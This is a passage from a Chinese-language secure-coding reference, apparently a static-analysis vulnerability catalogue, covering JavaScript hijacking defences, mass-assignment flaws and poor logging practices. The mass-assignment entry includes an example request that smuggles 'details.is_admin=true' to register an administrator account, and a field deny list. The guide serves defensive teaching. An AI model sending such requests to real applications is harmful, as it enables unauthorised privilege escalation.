<p>这不是钓鱼攻击 – 攻击者未获得用户凭证的访问权限 – 因此反钓鱼对策将无法打败攻击。更复杂的攻击可能会通过使用 JavaScript 动态生成脚本标签，向应用程序作出一系列请求。此相同技术有时会用于创建应用程序混合应用。唯一的不同是，在此混合应用情况中，涉及的应用程序之一是恶意的。 RECOMMENDATIONS 所有使用 JavaScript 进行通信的程序都应采取以下防范措施：1) 拒绝恶意请求：在每个返回给 JavaScript 的请求中都加入令人难以猜测的标识符，如会话标识符。允许服务器验证请求的来源可以防范跨站点请求的伪装攻击。2) 避免直接执行 JavaScript 响应：在响应中加入一些字符，使其只有经过修改，才能成功地转到 JavaScript 解释器进行处理。这样可以防止攻击者使用 <code>&lt;script&gt;</code> 标签看清 JavaScript 的执行过程。防范 JavaScript 劫持的最佳方法是同时采取上述两种防范策略。</p>
<p>拒绝恶意请求 从服务器的角度来看，JavaScript 劫持攻击类似于跨站点伪装请求，因此，防止跨站点伪装请求也就可以防止 JavaScript 劫持攻击。为了便于探测各种恶意请求，每个请求均应包含攻击者难以猜测的参数。一种方法是将会话 cookie 作为参数添加到请求中。服务器接收到这样一个请求时，它可以检查并确定会话 cookie 是否与请求中的参数值匹配。恶意代码无法取得会话 cookie（cookie 也需要遵循同源策略 (Same Origin Policy)），因此，攻击者即使制造了请求，也很难再通过检验了。也可以使用其他机密信息代替会话 cookie；只要这个机密信息难以猜测，可以在合法应用程序能够访问的上下文中使用，同时又无法通过其他的域进行访问，就可以防止攻击者制造有效的请求。</p>
<p>有一些框架仅能运行在客户端上。换言之，它们完全由 JavaScript 编写而成，对服务器的工作情况一无所知。这意味着它们并不知道会话 cookie 的名称。即使并不清楚会话 cookie 的名称，它们也能参与基于 cookie 的防范，途径就是将所有的 cookie 附加到发送给服务器的各个请求中。</p>
<p>示例 2：以下 JavaScript 片段描述了这种“盲客户端”策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var httpRequest = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">var cookies=&quot;cookies=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">http_request.open(&apos;POST&apos;, url, true);</span><br><span class="line"></span><br><span class="line">httpRequest.send(cookies);</span><br></pre></td></tr></table></figure>
<p>服务器也可以检查 HTTP referer 头信息，以确保请求来自于合法的应用程序，而不是恶意的应用程序。从历史上看，referer 头信息一直都未受到过信任，因此，我们并不建议您将它作为安全机制的基础。您可以为服务器装入一种针对 JavaScript hijacking 的防范方法，即让服务器只对 HTTP POST 请求做出响应，而不回应任何 HTTP GET 请求。这是一项防御技术，原因是 <code>`&lt;script&gt;</code> `标签通常使用 GET 方法从外部资源文件中加载 JavaScript。然而，这种防范措施并非尽善尽美。Web 应用程序的专家一致鼓励采用 GET 方法提高性能。如果在 HTTP 方法的选择上缺乏安全方面的考虑，这意味着未来的某一时刻，程序员可能会误认为这种功能上的不足是疏忽所致，而没有将它作为一种安全预警加以认识，进而修改了应用程序以响应 GET 请求。</p>
<p>防止直接执行响应 为了使恶意站点无法执行包含 JavaScript 的响应，合法的客户端应用程序可以利用允许执行前对接收的数据进行修改这一权限，而恶意的应用程序则只能使用 <code>&lt;script&gt;</code> 标签执行响应。当服务器序列化某个对象时，该对象应包括一个前缀（也可以是后缀），从而使它无法通过 <code>&lt;script&gt;</code> 标签执行 JavaScript。合法的客户端应用程序可以在运行 JavaScript 前删除这些无关的数据。</p>
<p>示例 3：该方法可以通过多种方式来实现。以下例子演示了两种方式。第一种，服务器可以把以下指令作为消息的前缀：</p>
<p>while(1);</p>
<p>除非客户端删除这些前缀，否则对这个消息求值将把 JavaScript 解释器发送到一个无限的循环中。客户端搜索并删除如下前缀：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,9) == &quot;while(1);&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(10);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>第二种，服务器可以在 JavaScript 附近加注注释字符，这些注释字符必须在 JavaScript 被送往 eval() 函数前删除。以下 JSON 对象已加入了一块注释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">客户端可以搜索并删除如下注释字符：</span><br><span class="line"></span><br><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,2) == &quot;/*&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(2, txt.length - 2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>任何通过 <code>&lt;script&gt;</code> 标签来提取敏感 JavaScript 的恶意站点都将无法获取其中所包含的数据。</p>
<p>自第 5 版 EcmaScript 起，已不可能攻击 JavaScript 数组构造函数。</p>
<h5 id="REFERENCES-26"><a href="#REFERENCES-26" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Chess, Y. O’Neil, and J. West JavaScript Hijacking</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-003300 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-003300 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-003300 CAT II</p>
<p>[7] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[8] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Mass-Assignment-Sensitive-Field-Exposure"><a href="#Mass-Assignment-Sensitive-Field-Exposure" class="headerlink" title="Mass Assignment: Sensitive Field Exposure"></a>Mass Assignment: Sensitive Field Exposure</h4><h5 id="ABSTRACT-27"><a href="#ABSTRACT-27" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>一个敏感字段已向模型绑定器公开。</p>
<h5 id="EXPLANATION-27"><a href="#EXPLANATION-27" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>现代框架可让开发人员将来自请求查询和正文的 HTTP 请求参数自动绑定至模型对象，以便于开发和提高生产率。如果绑定器未正确配置为控制将哪些 HTTP 请求参数绑定到哪些模型属性，攻击者可能会滥用模型绑定过程并设置不应向用户控件公开的任何其他属性。即使模型属性未出现在 Web 表单或 API 合约中，也可能会发生这种绑定。</p>
<p>例 1：以下 Struts 1 DynaActionForm 动态定义了绑定到用户请求的 ActionForm。在这种情况下，会通过提供帐户的类型和用户的详细信息，将其用于注册帐户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;struts-config&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">       &lt;form-bean name=&quot;dynaUserForm&quot;   </span><br><span class="line"></span><br><span class="line">          type=&quot;org.apache.struts.action.DynaActionForm&quot; &gt;</span><br><span class="line"></span><br><span class="line">              &lt;form-property name=&quot;type&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">              &lt;form-property name=&quot;user&quot; type=&quot;com.acme.common.User&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br></pre></td></tr></table></figure>
<p>如果注册成功，用户数据将保留在数据库中。User 类定义为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class User &#123;</span><br><span class="line"></span><br><span class="line">  private String name;</span><br><span class="line"></span><br><span class="line">  private String lastname;</span><br><span class="line"></span><br><span class="line">  private int age;</span><br><span class="line"></span><br><span class="line">  private Details details;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  // Public Getters and Setters</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Details 类定义为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class Details &#123;</span><br><span class="line"></span><br><span class="line">  private boolean is_admin;</span><br><span class="line"></span><br><span class="line">  private int id;</span><br><span class="line"></span><br><span class="line">  private Date login_date;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  // Public Getters and Setters</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据以上应用场景，攻击者可以探索应用程序并发现 User 模型中存在 details 属性。在这种情况下，攻击者可能会尝试覆盖分配给其属性的当前值。 如果攻击者可以找到这些内部属性，并且框架绑定器未正确配置为禁止绑定这些属性，则攻击者可能会通过发送以下请求注册管理员帐户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type=free&amp;user.name=John&amp;user.lastname=Smith&amp;age=22&amp;details.is_admin=true</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-25"><a href="#RECOMMENDATIONS-25" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了避免批量分配漏洞，控制 HTTP 请求对类绑定过程进行建模非常重要。根据所使用的框架，可以采用不同的备选方案：</p>
<p>体系结构：定义要绑定到用户数据并且仅包含应向最终用户公开的属性的专用 DTO 类。使用与应用程序一起使用的域对象映射其属性。这些域对象将包含接收已验证用户数据的属性以及绝不能向用户控件公开的额外属性。</p>
<p>绑定器配置：某些框架（如 Spring）允许开发人员将模型绑定器配置为根据参数名称接受或拒绝 HTTP 请求参数。例如：</p>
<p>例 2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line"></span><br><span class="line">protected void initBinder(HttpServletRequest request, ServletRequestDataBinder binder) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    binder.setDisallowedFields(new String[]&#123;&quot;details.role&quot;, &quot;details.age&quot;, &quot;is_admin&quot;&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>模型类配置：根据已使用的框架和正在使用的序列化/反序列化库，可以对要绑定到 HTTP 请求参数的模型类添加注释，以允许或禁止某种属性绑定。例如，如果采用 JSON 格式发送用户数据，并且使用 Jackson 库对该数据进行反序列化，则 @JsonIgnore 注释可用于让 Jackson 忽略给定属性，以实现序列化或反序列化。</p>
<p>例 3：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public class User &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    @JsonIgnore</span><br><span class="line"></span><br><span class="line">    private String role;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line"></span><br><span class="line">        return name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getRole() &#123;</span><br><span class="line"></span><br><span class="line">        return role;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setRole(String role) &#123;</span><br><span class="line"></span><br><span class="line">        this.role = role;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在其他框架（如 Apache Struts 1 和 2）中，框架仅允许将 HTTP 请求参数绑定到具有公共 setter 的类成员。如果不应公开给定属性，则 setter 应声明为私有。</p>
<p>例 4：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private String role;</span><br><span class="line"></span><br><span class="line">private void setRole(String role)  &#123;</span><br><span class="line"></span><br><span class="line">   this.role = role;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-27"><a href="#REFERENCES-27" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Mass assignment</p>
<p>[2] Spring Spring MVC Known Vulnerabilities and Issues</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 915</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Process Validation (WASC-40)</p>
<h4 id="Poor-Logging-Practice-Logger-Not-Declared-Static-Final"><a href="#Poor-Logging-Practice-Logger-Not-Declared-Static-Final" class="headerlink" title="Poor Logging Practice: Logger Not Declared Static Final"></a>Poor Logging Practice: Logger Not Declared Static Final</h4><h5 id="ABSTRACT-28"><a href="#ABSTRACT-28" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>声明记录器是固定且最终的。</p>
<h5 id="EXPLANATION-28"><a href="#EXPLANATION-28" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在某个特定类中的所有实例中，共享一个单一的记录器对象，并在程序的执行过程中使用同一个记录器，这是一个很好的编程习惯。</p>
<p>例 1：以下指令错误地声明了一个非固定日志记录器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private final Logger logger =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-26"><a href="#RECOMMENDATIONS-26" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>声明记录器是固定且最终的。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private final static Logger logger =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-28"><a href="#REFERENCES-28" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - FIPS200 AU</p>
<h4 id="Poor-Logging-Practice-Multiple-Loggers"><a href="#Poor-Logging-Practice-Multiple-Loggers" class="headerlink" title="Poor Logging Practice: Multiple Loggers"></a>Poor Logging Practice: Multiple Loggers</h4><h5 id="ABSTRACT-29"><a href="#ABSTRACT-29" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用多级别日志，而不是在单一的类中使用多个日志记录器。</p>
<h5 id="EXPLANATION-29"><a href="#EXPLANATION-29" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>良好记录行为是指为每个类使用一个日志记录器。</p>
<p>例 1：以下代码错误地声明了 multiple loggers。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass &#123;</span><br><span class="line"></span><br><span class="line">  private final static Logger good =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line">  private final static Logger bad =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line">  private final static Logger ugly =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-27"><a href="#RECOMMENDATIONS-27" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用不同的日志级别来区分不同类型的日志条目，而不是使用 multiple loggers。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass &#123;</span><br><span class="line"></span><br><span class="line">  private final static Logger logger =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;informative message here&quot;);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    logger.error(&quot;major problem at this point&quot;);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    logger.fatal(&quot;game over&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-29"><a href="#REFERENCES-29" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - FIPS200 AU</p>
<h4 id="Poor-Logging-Practice-Use-of-a-System-Output-Stream"><a href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream" class="headerlink" title="Poor Logging Practice: Use of a System Output Stream"></a>Poor Logging Practice: Use of a System Output Stream</h4><h5 id="ABSTRACT-30"><a href="#ABSTRACT-30" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 System.out 或 System.err 而不是专门的日志记录工具，会导致难以监控程序的运行状况。</p>
<h5 id="EXPLANATION-30"><a href="#EXPLANATION-30" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>例 1：开发人员学习编写的第一个 Java 程序通常都是如下所示的样子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;hello world&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多数程序员深入了解 Java 的许多精妙之处后，有一部分人仍会依赖于这一基础知识，始终使用 System.out.println() 编写进行标准输出的消息。</p>
<p>这里的问题是，直接在标准输出流或标准错误流中写入信息通常会作为一种非结构化日志记录形式使用。结构化日志记录系统提供了各种要素，如日志级别、统一的格式、日志标示符、次数统计，而且，可能最重要的是，将日志信息指向正确位置的功能。当系统输出流的使用与正确使用日志记录功能的代码混合在一起时，得出的结果往往是一个保存良好但缺少重要信息的日志。</p>
<p>开发者普遍认为需要使用结构化日志记录，但是很多人在“产前”的软件开发中仍使用系统输出流功能。如果您正在检查的代码是在开发阶段的初期生成的，那么对 System.out 或 System.err 的使用可能会在转向结构化日志记录系统的过程中导致漏洞。</p>
<h5 id="RECOMMENDATIONS-28"><a href="#RECOMMENDATIONS-28" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用 Java 日志记录工具而不是 System.out 或 System.err。</p>
<p>例 2：例如，上面的“hello world”程序可以使用 log4j 重新写成以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.log4j.Logger;</span><br><span class="line"></span><br><span class="line">import org.apache.log4j.BasicConfigurator;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public class MyClass &#123;</span><br><span class="line"></span><br><span class="line">  private final static Logger logger =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    BasicConfigurator.configure();</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;hello world&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-30"><a href="#REFERENCES-30" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - FIPS200 AU</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
